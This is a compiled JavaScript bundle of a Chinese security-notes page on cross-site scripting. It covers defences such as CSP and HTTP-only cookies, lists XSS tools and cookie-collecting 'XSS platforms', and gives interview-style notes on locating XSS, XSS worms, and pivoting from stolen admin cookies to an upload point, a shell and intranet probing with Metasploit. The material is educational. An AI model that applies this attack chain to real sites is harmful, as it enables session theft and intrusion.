punctuation"}),"("),Object(n.b)("span",c({parentName:"code"},{className:"token string"}),"'div'"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n        d",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"appendChild"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"document",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(n.b)("span",c({parentName:"code"},{className:"token function"}),"createTextNode"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),"str",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n        ",Object(n.b)("span",c({parentName:"code"},{className:"token keyword"}),"return")," d",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),"innerHTML",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),"\n    ",Object(n.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),"\n",Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),"?"),Object(n.b)("span",c({parentName:"code"},{className:"token operator"}),">")))),Object(n.b)("h2",{className:"__internal",id:"其他-xss-防范措施"},"其他 XSS 防范措施",Object(n.b)("a",c({parentName:"h2"},{href:"#%E5%85%B6%E4%BB%96-xss-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"介绍一些通用的方案，可以降低 XSS 带来的风险和后果。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"Content Security Policy")),Object(n.b)("p",null,"严格的 CSP 在 XSS 的防范中可以起到以下的作用："),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"禁止加载外域代码，防止复杂的攻击逻辑。"),Object(n.b)("p",{parentName:"blockquote"},"禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。"),Object(n.b)("p",{parentName:"blockquote"},"禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。"),Object(n.b)("p",{parentName:"blockquote"},"禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。"),Object(n.b)("p",{parentName:"blockquote"},"合理使用上报可以及时发现 XSS，利于尽快修复问题。")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"输入内容长度控制")),Object(n.b)("p",null,"对于不受信任的输入，都应该限定一个合理的长度。"),Object(n.b)("p",null,"虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"HTTP-only")),Object(n.b)("p",null,"HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。"),Object(n.b)("p",null,"验证码：防止脚本冒充用户提交危险操作。"),Object(n.b)("h1",{className:"__internal",id:"xss工具"},"xss工具",Object(n.b)("a",c({parentName:"h1"},{href:"#xss%E5%B7%A5%E5%85%B7","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,"XSS前端编码：",Object(n.b)("a",c({parentName:"p"},{href:"https://github.com/evilcos/xssor2",target:"_blank"}),"https://github.com/evilcos/xssor2")," "),Object(n.b)("p",null,"XSS平台： ",Object(n.b)("a",c({parentName:"p"},{href:"https://github.com/trysec/BlueLotus_XSSReceiver",target:"_blank"}),"https://github.com/trysec/BlueLotus_XSSReceiver")," "),Object(n.b)("p",null,"Xss-cheat-sheet： ",Object(n.b)("a",c({parentName:"p"},{href:"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",target:"_blank"}),"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet")," "),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"XSS_Fuzz")),Object(n.b)("table",null,Object(n.b)("thead",{parentName:"table"},Object(n.b)("tr",{parentName:"thead"},Object(n.b)("th",c({parentName:"tr"},{align:"left"}),"官网"),Object(n.b)("th",c({parentName:"tr"},{align:"left"}),"软件对应科普文"))),Object(n.b)("tbody",{parentName:"table"},Object(n.b)("tr",{parentName:"tbody"},Object(n.b)("td",c({parentName:"tr"},{align:"left"}),Object(n.b)("a",c({parentName:"td"},{href:"https://github.com/ym2011/PEST/tree/master/BruteXSS",target:"_blank"}),"BruteXSS")),Object(n.b)("td",c({parentName:"tr"},{align:"left"}),Object(n.b)("a",c({parentName:"td"},{href:"https://www.freebuf.com/sectool/109239.html",target:"_blank"}),"Freebuf相关科普")," ",Object(n.b)("a",c({parentName:"td"},{href:"https://www.cnblogs.com/Pitcoft/p/6341322.html",target:"_blank"}),"汉化版"))),Object(n.b)("tr",{parentName:"tbody"},Object(n.b)("td",c({parentName:"tr"},{align:"left"}),Object(n.b)("a",c({parentName:"td"},{href:"https://github.com/bsmali4/xssfork",target:"_blank"}),"XSSfrok")),Object(n.b)("td",c({parentName:"tr"},{align:"left"}),Object(n.b)("a",c({parentName:"td"},{href:"https://paper.seebug.org/359/#xssfork",target:"_blank"}),"Seebug作者教程"))))),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"http://xss.fbisb.com/xss.php",target:"_blank"}),".")),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://xs.sb/xss.php",target:"_blank"}),"..")),Object(n.b)("h2",{className:"__internal",id:"问题"},"问题",Object(n.b)("a",c({parentName:"h2"},{href:"#%E9%97%AE%E9%A2%98","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"如何快速发现 xss 位置 ？")),Object(n.b)("p",null,"对于反射型",Object(n.b)("inlineCode",{parentName:"p"},"XSS"),"："),Object(n.b)("p",null,"一般来说就是找输入点的可控参数，比如搜索框、留言板、 登录 / 注册，构造payload发送，监控响应"),Object(n.b)("p",null,"上边这种方法不适用于DOM型",Object(n.b)("inlineCode",{parentName:"p"},"XSS"),"，因为 基于DOM的",Object(n.b)("inlineCode",{parentName:"p"},"XSS"),"漏洞 ， payload并不在服务器的响应中返回，而是保存在浏览器的DOM中"),Object(n.b)("p",null,"对于存储型",Object(n.b)("inlineCode",{parentName:"p"},"XSS"),"：正常的输入payload查看是否过滤，也可以反向猜测输出点，构造payload去输入"),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"XSS 蠕虫的产生条件 ？")),Object(n.b)("ol",null,Object(n.b)("li",c({parentName:"ol"},{className:"__internal"}),Object(n.b)("p",{parentName:"li"},"可以执行恶意操作；")),Object(n.b)("li",c({parentName:"ol"},{className:"__internal"}),Object(n.b)("p",{parentName:"li"},"可以感染并传播 "),Object(n.b)("blockquote",{parentName:"li"},Object(n.b)("p",{parentName:"blockquote"},"就是产生",Object(n.b)("inlineCode",{parentName:"p"},"XSS"),"点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生 （微博、贴吧）"),Object(n.b)("p",{parentName:"blockquote"},"由于",Object(n.b)("inlineCode",{parentName:"p"},"XSS"),"蠕虫基于浏览器而不是操作系统，取决于其依赖网站的规模，它可以在短时间内达到对巨大数量的计算机感染 ")))),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://www.cnblogs.com/milantgh/p/3655070.html",target:"_blank"}),"一个大佬的博客各种XSS蠕虫源码分析")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},Object(n.b)("inlineCode",{parentName:"strong"},"XSS"),"，能打到后台，但是后台系统处于内网，怎么做内网探测？")),Object(n.b)("p",null,Object(n.b)("inlineCode",{parentName:"p"},"XSS"),"平台拿cookie登录后台，或钓鱼拿登录，然后找上传点",Object(n.b)("inlineCode",{parentName:"p"},"getshell"),"，然后结合msf使用"),Object(n.b)("p",null,"两个实例参考："),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://bbs.ichunqiu.com/thread-46068-1-1.html?from=bkyl",target:"_blank"}),"https://bbs.ichunqiu.com/thread-46068-1-1.html?from=bkyl")),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://shuimugan.com/bug/view?bug_no=76685%EF%BC%88%E8%BF%99%E6%98%AF%E4%B9%8C%E4%BA%91%E6%BC%8F%E6%B4%9E%E5%BA%93%E9%95%9C%E5%83%8F%EF%BC%89",target:"_blank"}),"https://shuimugan.com/bug/view?bug_no=76685（这是乌云漏洞库镜像）")),Object(n.b)("blockquote",null,Object(n.b)("p",{parentName:"blockquote"},"github有一些现成的xss扫描内网端口的脚本，可以参考利用，再根据探测出来的信息进一步利用，比如开了redis等，再就是利用漏洞去getshell")),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"XSS+CSRF组合拳")),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://damit5.com/2018/06/02/%E4%B8%80%E6%AC%A1XSS%E5%92%8CCSRF%E7%9A%84%E7%BB%84%E5%90%88%E6%8B%B3%E8%BF%9B%E6%94%BB-(CSRF+JSON)/",target:"_blank"}),"一次XSS和CSRF的组合拳进攻 (CSRF+JSON)")," "),Object(n.b)("p",null,Object(n.b)("a",c({parentName:"p"},{href:"https://forum.90sec.com/t/topic/211",target:"_blank"}),"各种漏洞组合拳打出不一样的姿势")))}b.isMDXComponent=!0,b=b}}]);